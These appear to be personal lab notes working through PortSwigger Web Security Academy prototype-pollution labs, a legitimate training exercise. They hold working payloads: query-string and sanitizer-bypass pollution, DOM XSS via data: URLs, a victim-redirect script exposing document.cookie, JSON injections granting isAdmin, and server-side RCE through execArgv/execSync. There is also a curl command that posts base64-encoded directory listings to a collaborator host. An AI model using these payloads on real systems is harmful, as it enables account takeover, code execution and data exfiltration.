
***Client-side prototype pollution via browser APIs***

From <https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis> 



Using Dom Invader. Kinda brain dead but useful in a fast scenario 

Enable DOM Invader and enable the prototype pollution option. 
Observe that DOM Invader has identified prototype pollution vectors in the search property i.e. the query string. 


Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4080c812-6765-40ce-96eb-b20b0d49580c)









Open up devtool panel and click exploit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/765a7428-3134-4679-8505-7b98eb72604a)


Manual solution 
Finding a protype pollution source 
In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: 

```
/?__proto__[foo]=bar
```
Open the browser DevTools panel and go to the Console tab. 
Enter `Object.prototype`. 

Study the properties of the returned object and observe that your injected foo property has been added. You've successfully found a prototype pollution source. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b9d5b156-8a55-4e0d-a47a-cd70f93f092c)



Identify a gadget
In the browser DevTools panel, go to the Sources tab.

Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.


In searchLoggerConfigurable.js, notice that if the config object has a transport_url property, this is used to dynamically append a script to the DOM.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1c956e6e-b823-4f80-8d98-bacfa3327c2e)




Observe that a transport_url property is defined for the config object, so this doesn't appear to be vulnerable. 


Observe that the next line uses the Object.defineProperty() method to make the transport_url unwritable and unconfigurable. However, notice that it doesn't define a value property.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/35b28b76-285b-4762-be2f-b844b5f3b757)


Craft an exploit 

Using the prototype pollution source you identified earlier, try injecting an arbitrary value property: 
```
/?__proto__[value]=foo
``` 
In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo. 
Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows: 
```
/?__proto__[value]=data:,alert(1);
``` 
Observe that the alert(1) is called and the lab is solved. 

From <https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/2793ffd8-bd79-4a15-b24d-40d17cb6dd2b)





***DOM XSS via client-side prototype pollution***

Manual solution


Find a protype pollution source 
```
/?__proto__[foo]=bar
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/59869378-3597-4130-acc6-0938ed68b3bc)






Identify a gadget 

In searchLogger.js, notice that if the config object has a transport_url property, this is used to dynamically append a script to the DOM. 


Notice that no transport_url property is defined for the config object. This is a potential gadget for controlling the src of the <script> element. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/662386b0-92c4-4791-905d-af4d771a68c2)



Craft an exploit


```
?__proto__[transport_url]=foo
```

In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4417a593-4899-4080-80cb-dcd70ef43331)




Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows: 

```
/?__proto__[transport_url]=data:,alert(1);
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d128d5fe-20a1-4d9a-aaf4-476b1991824d)





Dom xss method is same as previous (braindead)


***DOM XSS via an alternative prototype pollution vector***

From <https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector> 


DOM Invader solution

Exploit fail
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b795d874-8de6-4e56-b17d-841bbe62264d)


Go back to the previous browser tab and look at the eval() sink again in DOM Invader. Notice that following the closing canary string, a numeric 1 character has been appended to the payload. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a5ad6a95-0dfc-401d-827f-8e95487519a0)



• Click Exploit again. In the new tab that loads, append a minus character (-) to the URL and reload the page. 

```
?constructor[prototype][sequence]=alert%281%29&constructor.prototype.sequence=alert%281%29&__proto__.sequence=alert%281%29-&__proto__[sequence]=alert%281%29#constructor[prototype][sequence]=alert%281%29&constructor.prototype.sequence=alert%281%29&__proto__.sequence=alert%281%29&__proto__[sequence]=alert%281%29
```


Find a prototype pollution source 

Our usual method doesn’t work
```
?__proto__[foo]=bar
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2bc26e2-81f5-4922-99ff-5f4b72f5cedb)



Back in the query string, try using an alternative prototype pollution vector: 
```
/?__proto__.foo=bar
``` 
In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar. You've successfully found a prototype pollution source. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/cf415d45-6342-4c74-85e8-298638df1301)


Identify a gadget 

Notice that there is an eval() sink in searchLoggerAlternative.js. 
Notice that the manager.sequence property is passed to eval(), but this isn't defined by default. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9e4d4c1c-10d5-4425-aee3-cd7b3a30e86d)


Craft an exploit 

Our usual method
```
/?__proto__.sequence=alert(1)
```

payload doesn't execute and we trigger an error
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1a27a9ae-b5f2-43f0-9aff-9b26d7883a06)




Click the line number to add a breakpoint to this line, then refresh the page. 
Hover the mouse over the manager.sequence reference and observe that its value is alert(1)1. This indicates that we have successfully passed our payload into the sink, but a numeric 1 character is being appended to it, resulting in invalid JavaScript syntax. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b256714b-66c9-4afd-9082-56a4600f2bae)






Add trailing minus character to the payload to fix up the final JavaScript syntax:

```
?__proto__.sequence=alert(1)-
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/12423de5-67e6-4e28-9e38-cd6911b8551f)



***Client-side prototype pollution via flawed sanitization***


• In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string: 
```
/?__proto__.foo=bar
``` 

Study the properties of the returned object and observe that your injected foo property has not been added. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1b8cf631-5610-4579-a695-5357cb62d26d)

From <https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization> 





Trying alternative vector produce same result
```
/?__proto__[foo]=bar 
/?constructor.prototype.foo=bar
```


Go to the Sources tab and study the JavaScript files that are loaded by the target site. Notice that deparamSanitized.js uses the sanitizeKey() function defined in searchLoggerFiltered.js to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.

From <https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanit
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b0459ca4-f397-4e9c-a3c3-3bb882d8181c)





• Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example: 
```
• /?__pro__proto__to__[foo]=bar
•  /?__pro__proto__to__.foo=bar 
• /?constconstructorructor[protoprototypetype][foo]=bar 
• /?constconstructorructor.protoprototypetype.foo=bar
``` 

In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/4be97419-e1c7-4519-b55c-7fab9f7ad45c)


Identify a gadget

Study the JavaScript files again and notice that searchLogger.js dynamically appends a script to the DOM using the config object's transport_url property if present. 
Notice that no transport_url property is set for the config object. This is a potential gadget. 

From <https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6d8a1a08-8668-427a-81aa-4ffb83087c61)




Craft an exploit 
```
/?__pro__proto__to__[transport_url]=foo
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3391753f-3981-4444-a428-4e54fe83fa95)




```
/?__pro__proto__to__[transport_url]=data:,alert(1);
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5801a8dd-42db-4d98-844f-4d85271bb561)



Using dom invader you can try the same thing just remember to bypass the sanitization process

***Client-side prototype pollution in third-party libraries***

Scan using DOM invader

Exploit created by dom invader

```
?constructor[prototype][hitCallback]=alert%281%29&constructor.prototype.hitCallback=alert%281%29&__proto__.hitCallback=alert%281%29&__proto__[hitCallback]=alert%281%29#constructor[prototype][hitCallback]=alert%281%29&constructor.prototype.hitCallback=alert%281%29&__proto__.hitCallback=alert%281%29&__proto__[hitCallback]=alert%281%29
```



Disable DOM Invader. 


In the browser, go to the lab's exploit server. 
In the Body section, craft an exploit that will navigate the victim to a malicious URL as follows: 





```
<script>location=https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29</script>
``` 








Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the alert(document.cookie) payload is triggered. 
Go back to the exploit server and deliver the exploit to the victim to solve the lab. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/aa742241-573b-401f-b0f1-770cd03825be)




View exploit work than deliver to victim


**Privilege escalation via server-side prototype pollution**

From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution> 

Log in and submit form to change address 
Request is returned in json 
Identify a protype pollution source 

Add a new __proto__ 

```
"__proto__": {
    "foo":"bar"
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f35a7cf1-25b6-4f56-b90c-3f9943b19d7e)

Notice that the object in the response now includes the arbitrary property that you injected, but no **__proto__** property. This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain. 





Notice a isAdmin property set to false in first response. 



Modify the request to try polluting the prototype with your own isAdmin property: 

```
"__proto__": {
    "isAdmin":true
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/c2d9f6bb-eb8e-4bec-bb02-999c24c9e0d1)



We are now admin
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/601cde2e-5cb7-4f31-adba-6cd95c8d9da5)



**Detecting server-side prototype pollution without polluted property reflection**

Entering our payload from last lab doesn't show any reflection but that doesn’t mean we don’t have prototype pollution

![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/aa4e7521-71c7-43de-b5a0-2348114e384c)



When we remove the comma to get an error it shoes that our foo is reflected
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/3be8ba3b-2404-4596-9836-00cbe983dcb6)


We also get a 500 error with a 400 status property 

Fix the JSON syntax by reversing the changes that triggered the error. 
Modify your injected property to try polluting the prototype with your own distinct status property. Remember that this must be between 400 and 599. 

```
"__proto__": {
    "status":555
}
```

Intentionally break the JSON syntax again and reissue the request. 
Notice that this time, although you triggered the same error, the status and statusCode properties in the JSON response match the arbitrary error code that you injected into Object.prototype. This strongly suggests that you have successfully polluted the prototype and the lab is solved. 

From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/dd40f90e-d5f9-42b8-8eec-654dd4b83a8b)


**Bypassing flawed input filters for server-side prototype pollution**

From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution> 

Sign in and notice that we get address change response in json like previous
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/89dba6cd-4346-4298-98ae-0ed4a97a4431)



Identify a prototype pollution source

In Repeater, add a new property to the JSON with the name __proto__, containing an object with a json spaces property. 

```
"__proto__": {
    "json spaces":10
}
```

In the Response panel, switch to the Raw tab. Observe that the JSON indentation appears to be unaffected. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f6969bc6-e5e4-4842-ab7f-baa2bf158b5d)



Modify the request to try polluting the prototype via the constructor property instead: 
Response panel, go to the Raw tab. This time, notice that the JSON indentation has increased based on the value of your injected property. This strongly suggests that you have successfully polluted the prototype. 

```
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/34f3fce9-bd24-4a20-80c2-f576ed1d10b9)

Identify a gadget
Notice the isAdmin property, which is currently set to false. 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7581e476-67ea-49a5-9e25-b88386ed4802)

Modify the request to try polluting the prototype with your own isAdmin property: 

```
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```
We now have admin access

**Remote code execution via server-side prototype pollution**

Same as previous without constructor 
```
"__proto__": { "
json spaces":10 
}
```





Our exploit 

To probe with collaborator server 

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```


To execute remote code execution 

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/717370a7-7815-4130-ad8a-ef69b5560772)


• Go back to the admin panel and trigger the maintenance jobs again. Carlos's file is deleted and the lab is solved. 

From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution> 
![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d0ba8b8a-4e4b-4ade-bed3-1cee6e9b35fd)

**Exfiltrating sensitive data via server-side prototype pollution**

From <https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution> 


Require collaborator but the gist is the same

Identify a prototype pollution source

```
"__proto__": {
    "json spaces":10
}
```

Probe for remote code execution

```
"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

Leak the hidden file name
```
"input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
```

• Notice that you have received a new HTTP POST request with a Base64-encoded body. 
• Decode the contents of the body to reveal the names of two entries: node_apps and secret. 





